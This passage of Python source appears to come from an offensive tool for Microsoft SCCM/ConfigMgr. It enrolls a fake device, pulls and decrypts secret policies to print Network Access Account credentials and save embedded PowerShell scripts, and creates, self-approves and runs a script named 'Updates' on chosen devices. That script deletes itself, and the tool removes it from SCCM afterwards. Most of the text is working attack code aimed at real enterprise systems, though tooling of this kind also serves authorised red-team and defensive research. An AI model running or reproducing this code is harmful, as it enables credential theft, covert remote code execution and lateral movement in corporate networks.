	"COMPRESSED": POLICY_FLAGS.COMPRESSED
}

POLICY_FLAGS_MAP_INV = {v: k for k, v in POLICY_FLAGS_MAP.items()}

def signAndEncode(privKey, data):
	signature = privKey.sign(data, paddingASYM.PKCS1v15(), hashes.SHA256())
	signatureEnc = bytearray(signature)
	signatureEnc.reverse()
	signatureEnc = bytes(signatureEnc)

	return signatureEnc

def sendCCMPostRequest(session, target, proxy, data, auth = True):
	REQUEST_URL_AUTH = f"{target}/ccm_system_windowsauth/request" # This URL required Windows authentication with a computer account
	REQUEST_URL_UNAUTH = f"{target}/ccm_system/request" # This URL is unauthenticated

	headers = {"Connection": "close", "User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""}

	if proxy != None:
		proxies = {"http": proxy, "https": proxy}
	else:
		proxies = {}

	if auth:
		session.headers.update(headers)
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}
		res = session.request('CCM_POST', REQUEST_URL_AUTH, data = data, verify = False, proxies = proxies)
	else:
		res = requests.request('CCM_POST', REQUEST_URL_UNAUTH, data = data, headers = headers, verify = False)

	if res.status_code != 200:
		print("\t[-] Request to CCM endpoint failed", file = sys.stderr)
		return ''

	multipart_data = decoder.MultipartDecoder.from_response(res)
	deflatedData = ''
	for part in multipart_data.parts:
		if part.headers[b'content-type'] == b'application/octet-stream':
			deflatedData = zlib.decompress(part.content).decode('utf-16')
			break

	return deflatedData

def requestPolicy(url, privKey, guid):
	headers = {"Connection": "close", "User-Agent": "ConfigMgr Messaging HTTP Sender"}
	headers["ClientToken"] = "GUID:{};{};2".format(guid, datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"))
	headers["ClientTokenSignature"] = signAndEncode(privKey, "GUID:{};{};2".format(guid, datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()

	r = requests.get(f"{url}", headers = headers, verify = False)

	return r.content

OID_MAPPING = {
	'1.2.840.113549.3.7': "des-ede3-cbc",

	# PKCS1 v2.2
	'1.2.840.113549.1.1.1': 'rsaEncryption',
	'1.2.840.113549.1.1.2': 'md2WithRSAEncryption',
	'1.2.840.113549.1.1.3': 'md4withRSAEncryption',
	'1.2.840.113549.1.1.4': 'md5WithRSAEncryption',
	'1.2.840.113549.1.1.5': 'sha1-with-rsa-signature',
	'1.2.840.113549.1.1.6': 'rsaOAEPEncryptionSET',
	'1.2.840.113549.1.1.7': 'id-RSAES-OAEP',
	'1.2.840.113549.1.1.8': 'id-mgf1',
	'1.2.840.113549.1.1.9': 'id-pSpecified',
	'1.2.840.113549.1.1.10': 'rsassa-pss',

	# AES
	'2.16.840.1.101.3.4.1.41': 'aes256_ecb',
	'2.16.840.1.101.3.4.1.42': 'aes256_cbc',
	'2.16.840.1.101.3.4.1.43': 'aes256_ofb',
	'2.16.840.1.101.3.4.1.44': 'aes256_cfb',
	'2.16.840.1.101.3.4.1.45': 'aes256_wrap',
	'2.16.840.1.101.3.4.1.46': 'aes256_gcm',
	'2.16.840.1.101.3.4.1.47': 'aes256_ccm',
	'2.16.840.1.101.3.4.1.48': 'aes256_wrap_pad'
}

def cleanXML(xmlStr):
	root_end = xmlStr.rfind('</')
	if root_end != -1:
		root_end = xmlStr.find('>', root_end) + 1
		clean_xml_string = xmlStr[:root_end]
		xmlStr = clean_xml_string

	return xmlStr

def mscryptDeriveKeySha1(secret):
	# Implementation of CryptDeriveKey(prov, CALG_3DES, hash, 0, &cryptKey);

	buf1 = bytearray([0x36] * 64)
	buf2 = bytearray([0x5C] * 64)

	digest = hashes.Hash(hashes.SHA1(), backend=default_backend())
	digest.update(secret)
	hash_ = digest.finalize()

	for i in range(len(hash_)):
		buf1[i] ^= hash_[i]
		buf2[i] ^= hash_[i]

	digest1 = hashes.Hash(hashes.SHA1(), backend=default_backend())
	digest1.update(buf1)
	hash1 = digest1.finalize()

	digest2 = hashes.Hash(hashes.SHA1(), backend=default_backend())
	digest2.update(buf2)
	hash2 = digest2.finalize()

	derived_key = hash1 + hash2[:4]

	return derived_key

def deobfuscateSecretPolicyBlob(secretBlob):
	if isinstance(secretBlob, str):
		secretBlob = bytes.fromhex(secretBlob)

	dataLength = int.from_bytes(secretBlob[52:56], 'little')
	buffer = secretBlob[64:64+dataLength]

	key = mscryptDeriveKeySha1(secretBlob[4:4+0x28])
	iv = bytes([0] * 8)
	cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
	decryptor = cipher.decryptor()
	decryptedData = decryptor.update(buffer) + decryptor.finalize()

	padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
	decryptedData = padder.update(decryptedData) + padder.finalize()

	try:
		decryptedData = decryptedData.decode('utf-16-le')
	except:
		decryptedData = decryptedData.hex()

	return decryptedData

def parseSecretPolicy(privKey, policyID, policyJSON, policyContent):
	# Function will:
	# 	- Save embedded powershell scripts from secret policy if any into files
	# 	- Return parsed blobs: NAA credentials from secret policy and nb of powershell scripts if any

	parsedBlobs = []

	# Decrypt policy with private key to obtain XML

	content, _ = decode(policyContent, asn1Spec = rfc5652.ContentInfo())
	content, _ = decode(content.getComponentByName('content'), asn1Spec = rfc5652.EnvelopedData())
	encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
	keyEncryptionOID = str(content['recipientInfos'][0]['ktri']['keyEncryptionAlgorithm']['algorithm'])
	iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
	body = content['encryptedContentInfo']['encryptedContent'].asOctets()
	bodyEncryptionOID = str(content['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])

	plaintextBody = ''
	try:
		if OID_MAPPING[keyEncryptionOID] == 'rsaEncryption':
			plaintextKey = privKey.decrypt(encryptedRSAKey, paddingASYM.PKCS1v15())
		elif OID_MAPPING[keyEncryptionOID] == 'id-RSAES-OAEP':
			plaintextKey = privKey.decrypt(encryptedRSAKey, paddingASYM.OAEP(mgf = paddingASYM.MGF1(algorithm = SHA1()), algorithm = SHA1(), label = None))
		else:
			print(f"\t[-] Key decryption algorithm '{OID_MAPPING[keyEncryptionOID]}' is not currently supported", file = sys.stderr)
			return None
	except KeyError as e:
		print(f"\t[-] Unknown key decryption algorithm", file = sys.stderr)
		return None

	try:
		if OID_MAPPING[bodyEncryptionOID] == 'des-ede3-cbc':
			cipher = Cipher(algorithms.TripleDES(plaintextKey), modes.CBC(iv), backend = default_backend())
			decryptor = cipher.decryptor()
			plaintext = decryptor.update(body) + decryptor.finalize()
			plaintextBody = plaintext.decode('utf-16le')
		elif OID_MAPPING[bodyEncryptionOID] == 'aes256_cbc':
			cipher = Cipher(algorithms.AES(plaintextKey), modes.CBC(iv), backend = default_backend())
			decryptor = cipher.decryptor()
			plaintext = decryptor.update(body) + decryptor.finalize()
			plaintextBody = plaintext.decode('utf-16le')
		else:
			print(f"\t[-] Body decryption algorithm '{OID_MAPPING[bodyEncryptionOID]}' is not currently supported", file = sys.stderr)
			return None
	except KeyError as e:
		print(f"\t[-] Unknown body decryption algorithm", file = sys.stderr)
		return None

	plaintextBody = plaintextBody[:-1]
	plaintextBody = cleanXML(plaintextBody)

	# Parse XML

	if policyJSON["PolicyCategory"] == "CollectionSettings":
		print("\t[+] Processing a CollectionSettings Policy to extract Collection Variables")
		root = ET.fromstring(plaintextBody)
		binary_data = binascii.unhexlify(root.text)
		decompressed_data = zlib.decompress(binary_data)
		plaintextBody = decompressed_data.decode('utf16')

	root = ET.fromstring(plaintextBody)
	blobs_set = {}
	if policyJSON["PolicyCategory"] == "CollectionSettings":
		for instance in root.findall(".//instance"):
			name = None
			value = None
			for prop in instance.findall('property'):
				prop_name = prop.get('name')
				if prop_name == 'Name':
					name = prop.find('value').text.strip()
				elif prop_name == 'Value':
					value = prop.find('value').text.strip()
			blobs_set[name] = value
	else:
		obfuscated_blobs = root.findall('.//*[@secret="1"]')
		for obfuscated_blob in obfuscated_blobs:
			blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text

	print(f"\t[+] Found {len(blobs_set.keys())} obfuscated blob(s) in SCCM Secret Policy")
	for i, blob_name in enumerate(blobs_set.keys()):
		print(f"\t[+] Deobfuscate blob {i+1}")

		parsedBlob = {}
		parsedBlob['usernameNAA'] = None
		parsedBlob['pwdNAA'] = None
		parsedBlob['nbPS1Scripts'] = None

		data = deobfuscateSecretPolicyBlob(blobs_set[blob_name])

		if blob_name == "NetworkAccessUsername":
			parsedBlob['usernameNAA'] = data
		if blob_name == "NetworkAccessPassword":
			parsedBlob['pwdNAA'] = data

		try:
			blobroot = ET.fromstring(cleanXML(data))
			sourceScripts = blobroot.findall('.//*[@property="SourceScript"]')
			nbPS1Scripts = len(sourceScripts)
			parsedBlob['nbPS1Scripts'] = nbPS1Scripts
			if nbPS1Scripts > 0:
				print(f"\t\t[+] Found {nbPS1Scripts} embedded Powershell scripts in blob")
				for j, script in enumerate(sourceScripts):
					decodedScript = base64.b64decode(script.text).decode('utf-16le')
					scriptNameOut = f'{policyID}_secretBlob_{str(i+1)}-{blob_name}_embeddedScript_{j+1}.txt'
					with open(scriptNameOut, 'w') as f:
						f.write(decodedScript)
						f.write("\n")
						print(f"\t\t[+] '{scriptNameOut}' saved")
		except ET.ParseError as e:
			print("\t\t[-] Failed parsing XML blob for Powershell scripts", file = sys.stderr)
			pass

		parsedBlobs += [parsedBlob]

	return parsedBlobs

def requestPolicies(session, target, proxy, domain, unauthRegistration = False, devicePEMPrivKey = None, deviceGUID = None, sleepTime = 10, saveCertificate = False):
	print_yellow("[*] Requesting SCCM Policies")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		GUID = ''
		privKey = ''
		pubKey = ''

		deviceNameToRegister = 'MYDEVICE' # Does not need to exist
		if domain != None:
			deviceFQDNToRegister = f'MYDEVICE.{domain}' # Does not need to exist
		else:
			deviceFQDNToRegister = f'MYDEVICE.local' # Does not need to exist

		if devicePEMPrivKey != None or deviceGUID != None:
			if devicePEMPrivKey == None or deviceGUID == None:
				print(f"[-] PEM private key and GUID of device required", file = sys.stderr)
				return

			print(f"[+] Using already registered device with GUID '{deviceGUID}'")
			GUID = deviceGUID
			privKey = serialization.load_pem_private_key(open(devicePEMPrivKey, 'rb').read(), password = None)
			pubKey = privKey.public_key()
		else:
			############################
			# Register and approve the provided account (Name and FQDN can be faked)
			############################

			print(f"[+] Try to register and approve fake device '{deviceNameToRegister}'")

			# Create a DER certificate from RSA private key
			privKey = rsa.generate_private_key(public_exponent = 65537, key_size = 2048)
			pubKey = privKey.public_key()
			subject = issuer = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"ConfigMgr Client"),])
			cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(pubKey).serial_number(x509.random_serial_number()).not_valid_before(
				datetime.datetime.utcnow() - datetime.timedelta(days = 2)
				).not_valid_after(
					datetime.datetime.utcnow() + datetime.timedelta(days = 365)
				).add_extension(
					x509.KeyUsage(digital_signature = True, key_encipherment = False, key_cert_sign = False,
									key_agreement = False, content_commitment = False, data_encipherment = True,
									crl_sign = False, encipher_only = False, decipher_only = False), critical = False
				).add_extension(
					# SMS Signing Certificate (Self-Signed)
					x509.ExtendedKeyUsage([x509.ObjectIdentifier("1.3.6.1.4.1.311.101.2"), x509.ObjectIdentifier("1.3.6.1.4.1.311.101")]),
					critical = False,
				).sign(privKey, hashes.SHA256())
			if saveCertificate:
				with open(f"MYDEVICE.pem", "wb") as f:
					f.write(privKey.private_bytes(encoding = serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm = serialization.NoEncryption()))
				print("\t[+] X509 certificate created and saved to MYDEVICE.pem")

			# Build the registration request with the certificate and the provided account to register
			REGISTRATION_REQUEST = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}"><AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" /><Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates><DiscoveryProperties><Property Name="Netbios Name" Value="{client}" /><Property Name="FQ Name" Value="{clientfqdn}" /><Property Name="Locale ID" Value="2057" /><Property Name="InternetFlag" Value="0" /></DiscoveryProperties></Data>"""
			certEncoded = cert.public_bytes(serialization.Encoding.DER).hex().upper()
			embedded = REGISTRATION_REQUEST.format(date = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"), encryption = certEncoded,
											signature = certEncoded, client = deviceNameToRegister, clientfqdn = deviceFQDNToRegister)
			signature = signAndEncode(privKey, embedded.encode('utf-16')[2:]).hex().upper()

			REGISTRATION_REQUEST_WRAPPER = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
			request = REGISTRATION_REQUEST_WRAPPER.format(data = embedded, signature = signature).encode('utf-16')[2:] + "\r\n".encode('ascii')

			MSG_HEADER = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
			header = MSG_HEADER.format(bodylength = len(request)-2, client = deviceNameToRegister, date = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"), sccmserver = target.split('://')[1])

			data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

			############################
			# Send the registration request to the CCM endpoint
			############################

			# Client approval method configuration on SCCM can be one of
			#		- (1) Automatically approve computers in trusted domains (Default)
			#		- (2) Manual approve each computer
			#		- (3) Automatically approve all computers

			if unauthRegistration == True:
				# Device will be approved if (3) - non-default configuration
				print("\t[+] Using unauthenticated CCM endpoint")
				deflatedData = sendCCMPostRequest(session, target, proxy, data, auth = False)
			else:
				# Device will be approved if HTTP session use a domain computer (1) - default configuration
				print("\t[+] Using authenticated CCM endpoint")
				deflatedData = sendCCMPostRequest(session, target, proxy, data, auth = True)

			# Device MUST be approved to request SCCM Policies

			if deflatedData == '':
				print("\t[-] Failed to registered fake device through CCM endpoint", file = sys.stderr)
				return
			else:
				r = re.findall("SMSID=\"GUID:([^\"]+)\"", deflatedData)
				if r == None:
					print("\t[-] Failed to retrieve GUID from response of CCM endpoint", file = sys.stderr)
					return

				GUID = r[0]
				print(f"\t[+] Fake device enrolled")
				print(f"\t[+] GUID = {GUID}")
				print(f"\t[+] Waiting {sleepTime}s for SCCM database to update before requesting SCCM Policies")
				time.sleep(sleepTime)

		############################
		# Request SCCM Policies to the CCM endpoint
		############################

		print("[+] Requesting SCCM Policies")

		POLICY_BODY = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
		body = POLICY_BODY.format(clientid = GUID, clientfqdn = deviceFQDNToRegister, client = deviceNameToRegister).encode('utf-16')[2:] + b"\x00\x00\r\n"
		bodyCompressed = zlib.compress(body)

		# MSPublicKeyBlob: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
		blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
		blob = blobHeader + pubKey.public_numbers().n.to_bytes(int(privKey.key_size / 8), byteorder = "little")
		public_key = blob.hex().upper()

		clientID = f"GUID:{GUID.upper()}"

		clientIDSignature = signAndEncode(privKey, clientID.encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
		payloadSignature = signAndEncode(privKey, bodyCompressed).hex().upper()

		MSG_HEADER_POLICY = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""

		header = MSG_HEADER_POLICY.format(bodylength = len(body)-2, sccmserver = target.split('://')[1], client = deviceNameToRegister, publickey = public_key, clientIDsignature = clientIDSignature,
											payloadsignature = payloadSignature,
											clientid = GUID,
											date = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"))

		data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

		deflatedData = sendCCMPostRequest(session, target, proxy, data, auth = False)
		if deflatedData == '':
			print("\t[-] Failed to request SCCM Policies. Device may not be approved", file = sys.stderr)
			return

		root = ET.fromstring(deflatedData[:-1])
		policies = root.findall(".//Policy")
		if len(policies) == 0:
			print(f"\t[+] No SCCM Policies found")
			return

		print(f"\t[+] {len(policies)} SCCM Policies gathered")
		policiesJSON = {}
		for policy in policies:
			policiesJSON[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "<N/A>",
											"PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "<N/A>",
											"PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "<N/A>",
											"PolicyFlags": "|".join([POLICY_FLAGS_MAP_INV[k] for k in POLICY_FLAGS(int(policy.attrib["PolicyFlags"]))]) if "PolicyFlags" in policy.attrib else "<N/A>",
											"PolicyLocation": policy[0].text.replace("<mp>", target.split('://')[1])}

		############################
		# Parsing secret policies
		############################

		for key, value in policiesJSON.items():
			if "SECRET" in value["PolicyFlags"]:
				print(f"[+] Parsing SCCM Secret Policy '{key}'")
				r = requestPolicy(value['PolicyLocation'], privKey, GUID)
				parsedBlobs = parseSecretPolicy(privKey, key, value, r)
				policiesJSON[key]['blobs'] = parsedBlobs
			else:
				policiesJSON[key]['blobs'] = None

		############################
		# Displaying SCCM Policies
		############################

		print("[+] Displaying SCCM Policies")
		for key, value in policiesJSON.items():
			print(f"\t[+] Policy '{key}'")
			print(f"\t\t[+] Type = {value['PolicyType']}")
			print(f"\t\t[+] Category = {value['PolicyCategory']}")
			print(f"\t\t[+] Flags = {value['PolicyFlags']}")
			print(f"\t\t[+] Location = {value['PolicyLocation']}")
			if value['blobs'] != None: # Parse blobs
				usernameNAA = None
				pwdNAA = None
				if value['PolicyCategory'] == 'NAAConfig': # Display NAA Credentials
					for blob in value['blobs']:
						if blob['usernameNAA'] != None:
							usernameNAA = blob['usernameNAA']
						if blob['pwdNAA'] != None:
							pwdNAA = blob['pwdNAA']
					print(f"\t\t[+] NAA Credentials = {usernameNAA}:{pwdNAA}")
				else: # Display raw blobs
					for i, blob in enumerate(value['blobs']):
						print(f"\t\t[+] Secret blob {i+1}")
						empty = True
						if blob['nbPS1Scripts'] != None:
							empty = False
							print(f"\t\t\t[+] {blob['nbPS1Scripts']} PS1 script(s)")
						if empty:
							print("\t\t\t[+] Empty")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

### Scripts ###

def approveScript(session, target, proxy, scriptGUID):
	print_yellow(f"[*] Approving SCCM script")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		body = {"Approver": "", "ApprovalState": "3", "Comment": ""}
		endpoint = f"{target}/AdminService/wmi/SMS_Scripts/{scriptGUID}/AdminService.UpdateApprovalState"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies)
		if res.status_code == 201:
			print(f"[+] SCCM script with guid '{scriptGUID}' approved")
		elif res.status_code == 500:
			print("[-] Hierarchy settings do not allow author's to approve their own scripts. Try approving with another user")
		else:
			print("[-] Failed to approve script")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def deleteScript(session, target, proxy, scriptGUID):
	print_yellow(f"[*] Deleting SCCM script")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		endpoint = f"{target}/AdminService/wmi/SMS_Scripts/{scriptGUID}"
		res = session.delete(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 204:
			print(f"[+] Script with GUID '{scriptGUID}' deleted")
		else:
			print(f"[-] Failed to delete script with GUID '{scriptGUID}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def runScript(session, target, proxy, scriptGUID, device):
	print_yellow(f"[*] Running SCCM script")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		# Running script

		print(f"[+] Running script with GUID '{scriptGUID}' on device with resource ID '{device}'")

		body = {"ScriptGuid": scriptGUID}
		endpoint = f"{target}/AdminService/v1.0/Device({device})/AdminService.RunScript"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies).json()
		opid = res['value']

		print(f"\t[+] Script executed. Operation ID = {opid}")

		# Requesting script output

		print(f"[+] Requesting script output")

		endpoint = f"{target}/AdminService/v1.0/Device({device})/AdminService.ScriptResult(OperationId=({opid}))"
		while True:
			try:
				body = {"MoreResult": True}
				res = session.get(endpoint, verify = False, json = body, proxies = proxies)
				if res.status_code == 404:
					time.sleep(15)
					continue

				data = res.json()
				output = data['value']['Result'][0]
				result = output['ScriptOutput']
				result = result.replace('["', '')\
					.replace('"]','')\
					.replace(r"\u003e", ">")\
					.replace(r"\r\n", "\n")\
					.replace('","', "\n")\
					.replace(',"', "\n")
				cleanResult = "\n".join(line.strip() for line in result.split(r"\n"))
				print("-------------------------------")
				print(cleanResult)
				print("-------------------------------")
				break
			except Exception as e:
				print("\t[-] Failed to get script output", file = sys.stderr)

		return opid
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def doScript(session, target, proxy, scriptPath, device):
	print_yellow("[*] Requesting SCCM script")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		# Adding script

		print(f"[+] Adding script to SCCM")

		script = ''
		cleanup = '''
function Do-Delete {
	Del $MyInvocation.PSCommandPath
}
Do-Delete
''' 	# Add automatic cleanup
		with open(scriptPath, "r", encoding = 'utf-8') as f:
			content = f.read()
			content += cleanup
			bom = codecs.BOM_UTF16_LE
			byteArray = bom + content.encode('utf-16-le')
			script = base64.b64encode(byteArray).decode('utf-8')

		scriptGUID = str(uuid.uuid4())
		body = {"ApprovalState": 3, "ParamsDefinition": "", "ScriptName": "Updates", "Author": "", "Script": script, "ScriptVersion": "1", "ScriptType": 0, "ParameterlistXML": "", "ScriptGuid": scriptGUID}
		endpoint = f"{target}/AdminService/wmi/SMS_Scripts.CreateScripts/"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies)
		if res.status_code != 201:
			print("[-] Failed to create script", file = sys.stderr)
			return

		print(f"\t[+] Script created with GUID {scriptGUID}")

		# Approving script

		print("[+] Approving script")

		body = {"Approver": "", "ApprovalState": "3", "Comment": ""}
		endpoint = f"{target}/AdminService/wmi/SMS_Scripts/{scriptGUID}/AdminService.UpdateApprovalState"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies)
		if res.status_code == 500:
			print("\t[-] Hierarchy settings do not allow author's to approve their own scripts. Try approving with another user")
			return
		if res.status_code != 201:
			print("\t[-] Failed to approve script")
			return

		print(f"\t[+] Script approved")

		# Running script

		print(f"[+] Running script on device with resource ID '{device}'")

		body = {"ScriptGuid": scriptGUID}
		endpoint = f"{target}/AdminService/v1.0/Device({device})/AdminService.RunScript"
		res = session.post(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, json = body, proxies = proxies).json()
		opid = res['value']

		print(f"\t[+] Script executed. Operation ID = {opid}")

		# Requesting script output

		print(f"[+] Requesting script output")

		endpoint = f"{target}/AdminService/v1.0/Device({device})/AdminService.ScriptResult(OperationId=({opid}))"
		while True:
			try:
				body = {"MoreResult": True}
				res = session.get(endpoint, verify = False, json = body, proxies = proxies)
				if res.status_code == 404:
					time.sleep(10)
					continue

				data = res.json()
				output = data['value']['Result'][0]
				result = output['ScriptOutput']
				result = result.replace('["', '')\
					.replace('"]','')\
					.replace(r"\u003e", ">")\
					.replace(r"\r\n", "\n")\
					.replace('","', "\n")\
					.replace(',"', "\n")
				cleanResult = "\n".join(line.strip() for line in result.split(r"\n"))
				print("-------------------------------")
				print(cleanResult)
				print("-------------------------------")
				break
			except Exception as e:
				print("\t[-] Failed to get script output", file = sys.stderr)

		# Deleting script

		print(f"[+] Deleting script")

		endpoint = f"{target}/AdminService/wmi/SMS_Scripts/{scriptGUID}"
		res = session.delete(endpoint, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code == 204:
			print(f"\t[+] Script deleted")
		else:
			print("\t[-] Failed to delete script", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

### CMPivot ###

def doCMPivot(session, target, proxy, cmd, runType, runTarget):
	print_yellow("[*] Requesting CMPivot")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return
		
		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		if cmd == "InstalledSoftware":
			cmd += " | distinct ProductName, Publisher, ProductVersion"
		elif cmd == "LogicalDisk":
			cmd += " | distinct Device, Description, Caption, DeviceID"
		elif cmd == "Services":
			cmd += " | distinct Device, Name, PathName, ProcessId, ServiceType, Started"
		elif cmd == "OS":
			cmd += " | distinct Caption, Version, OSArchitecture, Device"
		else:
			pass

		body = {"InputQuery": cmd}
		if runType == "Collections":
			runTarget = f"'{runTarget}'"
		endpoint = f"{target}/AdminService/v1.0/{runType}({runTarget})/AdminService.RunCMPivot"
		res = session.post(endpoint, json = body, verify = False, headers = {'Content-Type': 'application/json; odata=verbose'}, proxies = proxies)
		if res.status_code != 200:
			print("[-] Failed to run CMPivot", file = sys.stderr)
			return

		res = res.json()
		if runType == "Device":
			opid = res['value']['OperationId']
		else: # Collections
			opid = res['OperationId']

